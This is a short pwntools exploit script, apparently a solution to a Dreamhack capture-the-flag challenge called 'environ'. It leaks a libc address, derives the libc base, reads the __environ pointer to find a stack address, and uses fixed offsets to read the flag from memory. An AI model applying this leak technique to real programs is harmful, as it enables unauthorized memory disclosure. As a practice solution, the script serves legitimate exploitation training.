#!/usr/bin/python3

from pwn import *

context.log_level = 'debug'
context.binary = exe = ELF('./environ',checksec=False)
libc = ELF('./libc.so.6',checksec=False)

p = process(exe.path)
#p = remote('host3.dreamhack.games', 20692)

# gdb.attach(p, gdbscript='''
# 	b*main+41
# 	b*read_file+77
# 	b*main+112
# 	b*main+169
# 	''')
# input()

p.recvuntil(b'stdout: ')
stdout = int(p.recvline()[:-1],16)
print(hex(libc.sym['__environ']))
print(hex(libc.sym['_IO_2_1_stdout_']))

libc.address = stdout - libc.sym['_IO_2_1_stdout_']

environ = libc.sym['__environ']
log.info(" stdout leak: " + hex(stdout))
log.info("libc base: " + hex(libc.address))
log.info("environ: " + hex(environ))

p.sendlineafter(b'>', b'1')
p.sendlineafter(b'Addr: ', str(environ).encode())

#p.recv(1)

leak = u64(p.recv(6) + b'\0\0')
log.info("leak: " + hex(leak))
flag = leak - 0x1538 - 0x30

log.info("flag addr: " + hex(flag))
p.sendlineafter(b'>', b'1')
p.sendlineafter(b'Addr: ', str(flag).encode())

p.interactive()